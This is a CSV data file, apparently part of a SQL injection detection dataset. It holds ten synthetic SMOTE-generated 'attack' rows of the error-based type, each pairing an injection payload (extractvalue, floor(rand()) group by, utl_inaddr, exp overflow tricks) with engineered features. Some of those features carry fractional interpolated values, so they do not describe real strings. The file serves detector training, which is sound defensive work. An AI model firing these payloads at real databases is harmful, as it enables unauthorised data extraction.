id,label,payload_type,payload,retrieval_method,retrieval_source_id,retrieval_distance,length,num_unique_chars,entropy,alpha_count,digit_count,space_count,punct_count,alpha_ratio,digit_ratio,space_ratio,punct_ratio,single_quote_count,double_quote_count,dash_count,slash_count,star_count,equals_count,semicolon_count,paren_count,percent_count,underscore_count,comma_count,operator_count,has_single_quote,has_double_quote,has_comment_dashdash,has_comment_hash,has_comment_block,has_equal,has_parentheses,has_semicolon,has_percent_encoding,has_hex_literal,has_concat_operator,kw_select,kw_union,kw_where,kw_from,kw_and,kw_or,kw_insert,kw_update,kw_delete,kw_drop,kw_create,kw_alter,kw_sleep,kw_benchmark,kw_waitfor,kw_delay,kw_information_schema,kw_table,kw_column,kw_database,kw_cast,kw_convert,kw_concat,kw_substr,kw_substring,kw_ascii,kw_char,kw_load_file,kw_outfile,kw_exec,kw_order,kw_by,kw_exists,kw_case,kw_when,keyword_total
SMOTE_000001,attack,error,"1'  )   or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and   (  'iwkg'  =  'iwkg",nearest_attack_euclidean,R000147,1.0524163194454117,281.21912532756886,37.70318755459481,3.980267287095152,104.62550043675849,35.0,105.0,36.593624890810375,0.3719504817332702,0.12447003627374431,0.37341010882123293,0.1301693731717526,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.0,0.593624890810378,2.0,5.0,4.0,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000002,attack,error,"1'+  (  select bruk where 1400  =  1400 procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1   )    )   +'",nearest_attack_euclidean,R000081,1.5437855343262687,228.0885123874952,33.31113092697394,3.9357696983988477,77.88869073026063,45.0,80.82208351118246,24.377738146052128,0.3412002410553345,0.19759524831172165,0.3543236138631403,0.10688089676980357,1.3777381460521276,0.31113092697393624,0.6222618539478724,0.0,1.1102230246251565e-16,2.0,0.0,13.688869073026064,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,4.0,0.6888690730260639,0.3111309269739362,0.3111309269739362,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.6888690730260638,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.688869073026064
SMOTE_000003,attack,error,"-4822"" or 4493  =  utl_inaddr.get_host_address  (  chr  (  113  )  ||chr  (  113  )  ||chr  (  112  )  ||chr  (  106  )  ||chr  (  113  )  ||  (  select   (  case when   (  4493  =  4493  )   then 1 else 0 end  )   from dual  )  ||chr  (  113  )  ||chr  (  122  )  ||chr  (  118  )  ||chr  (  122  )  ||chr  (  113   )    )    and ""owbp""  =  ""owbp",nearest_attack_euclidean,R000078,0.5605011328852397,346.75548447175896,35.75548447175898,3.7223624654049323,98.38871117939746,48.611288820602546,140.0,59.755484471758976,0.2837329475549996,0.1401984209673362,0.4037441604974627,0.17232447098020154,0.0,3.633226707638474,1.1222577641205087,0.0,1.1102230246251565e-16,3.0,0.0,28.0,2.7755575615628914e-17,3.0,0.0,24.122257764120505,0.0,1.0,0.12225776412050869,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,1.0,1.0,0.0,0.1222577641205087,1.0,1.0,0.8777422358794913,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,6.0
SMOTE_000004,attack,error,"1%""   )    )     )   and   (  select 9067 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9067  =  9067,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a  )   and    (    (     (  ""%""  =  """,nearest_attack_euclidean,R000117,0.9231316881254961,294.14010702151523,36.31439571913939,3.8174521572603908,99.68560428086062,35.0,118.7120856172122,40.74241712344244,0.33938654207411934,0.11918254063460164,0.4029518789144414,0.13847903837683764,0.0,4.0,0.0,0.0,2.0,2.0,0.0,22.74241712344244,2.0,2.0,5.0,4.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,2.0,1.6856042808606102,0.31439571913938985,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,10.0
SMOTE_000005,attack,error,"1'||  (  select 'lpej' from dual where 8294  =  8294 or   (  select 9173 from  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  9173  =  9173,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from information_schema.character_sets group by x  )  a   )    )   ||'",nearest_attack_euclidean,R000065,0.22942659424730436,311.33355249826894,40.878827726957994,4.119842221467406,118.57589704435297,43.0,109.878827726958,39.878827726957994,0.3808457612503633,0.13812566277551788,0.3529421530368995,0.12808642293721925,4.0,0.0,0.0,0.0,2.0,2.0,0.0,20.0,2.7755575615628914e-17,2.0,5.0,7.878827726957993,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.9394138634789961,4.0,0.0,1.0,2.939413863478996,0.060586136521003864,0.9394138634789961,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,11.939413863478997
SMOTE_000006,attack,error,"1""   )    )    or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )    and    (    (   ""nwzu"" like ""nwzu",nearest_attack_euclidean,R000016,0.8164217101398012,219.55596115882787,32.67673080374292,3.500027058825394,58.32326919625708,32.0,99.58615357005662,29.646538392514156,0.26573626201622436,0.1458274033879407,0.45343206352435,0.13500427107148497,0.0,4.0,0.0,0.0,1.0,1.0,0.0,18.646538392514156,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,2.0,0.0,1.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,3.0,0.0,0.0,1.0,1.3232691962570786,0.6767308037429214,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.0
SMOTE_000007,attack,error,"1'  )   or row  (  1045,7562  )  >  (  select count  (  *  )  ,concat  (  0x7171706a71,  (  select   (  elt  (  1045  =  1045,1   )    )     )  ,0x717a767a71,floor  (  rand  (  0  )  *2   )    )   x from   (  select 8488 union select 5584 union select 3051 union select 1210  )  a group by x  )   and   (  'xzlx' like 'xzlx",nearest_attack_euclidean,R000125,0.4724975591269419,319.9351561996091,38.0,4.024811828330174,112.159375006108,55.0,117.30468745419009,35.471093739311016,0.35135655068751015,0.17219677564702487,0.3657460418013711,0.11070063186409389,4.0,0.0,0.0,0.0,2.0,1.2101562484730026,0.0,21.260937490838018,2.7755575615628914e-17,-1.1102230246251565e-16,6.0,4.210156248473003,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,6.0,3.0,0.0,1.0,1.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,0.0,0.0,0.0,14.0
SMOTE_000008,attack,error,"1'  )   procedure analyse  (  extractvalue  (  5840,concat  (  0x5c,0x7171706a71,  (  select   (  case when   (  5840  =  5840  )   then 1 else 0 end   )    )   ,0x717a767a71   )    )   ,1  )   and   (  'eiau'  =  'eiau",nearest_attack_euclidean,R000100,0.72989897181579,223.66185863187005,31.274226978345297,3.877873610283613,78.09690791338119,39.193815826762375,80.82268093503589,25.548453956690594,0.3493007452669392,0.1749082287880537,0.36156679889759413,0.1142242270474129,4.0,0.0,0.0,0.0,1.1102230246251565e-16,2.0,0.0,14.0,2.7755575615628914e-17,-1.1102230246251565e-16,5.0,2.548453956690593,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,2.7755575615628914e-17,1.2742269783452964,0.0,0.27422697834529647,0.0,0.7257730216547035,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,1.0,1.0,5.274226978345297
SMOTE_000009,attack,error," AND 1  =  utl_inaddr.get_host_address   (    (   SELECT DISTINCT  (  column_name  )   FROM   (  SELECT DISTINCT  (  column_name  )  , ROWNUM AS LIMIT FROM all_tab_columns  )   WHERE LIMIT  =  6   )    )    AND 'i'  =  'i",nearest_attack_euclidean,R000008,1.3330435624280133,234.18683950446646,42.899268861359246,4.397411474054561,132.58976405902948,2.0,73.69780658407774,25.899268861359246,0.5649452399106488,0.008589653994637486,0.31555400257371646,0.11091110352099716,3.0,0.0,0.0,0.0,1.1102230246251565e-16,3.449634430679624,0.0,10.0,2.7755575615628914e-17,6.449634430679624,1.0,3.449634430679624,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,0.0,2.7755575615628914e-17,2.0,0.0,1.449634430679624,2.0,2.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.449634430679624
SMOTE_000010,attack,error,"1'||  (  select 'zbdv' where 1618  =  1618 or exp  (  ~  (  select * from   (  select concat  (  0x7171706a71,  (  select   (  elt  (  6270  =  6270,1   )    )     )  ,0x717a767a71,0x78   )    )   x   )    )     )  ||'",nearest_attack_euclidean,R000069,1.1931005019422127,209.51101661485325,33.056779623872586,3.6996504628127607,56.74237283183011,37.48474566366023,85.17033887161776,30.11355924774517,0.27129541077086977,0.17847240237484507,0.4067958214108647,0.1434363654434205,4.0,0.0,0.0,0.0,1.0,2.0,0.0,15.371186415915055,2.7755575615628914e-17,-1.1102230246251565e-16,4.0,5.742372831830113,1.0,0.0,0.0,-1.3877787807814457e-17,0.0,1.0,1.0,0.0,0.0,1.0,0.6855932079575282,3.6855932079575284,0.0,0.6855932079575282,1.0,0.3144067920424718,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,3.469446951953614e-18,0.0,1.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,0.0,7.685593207957528
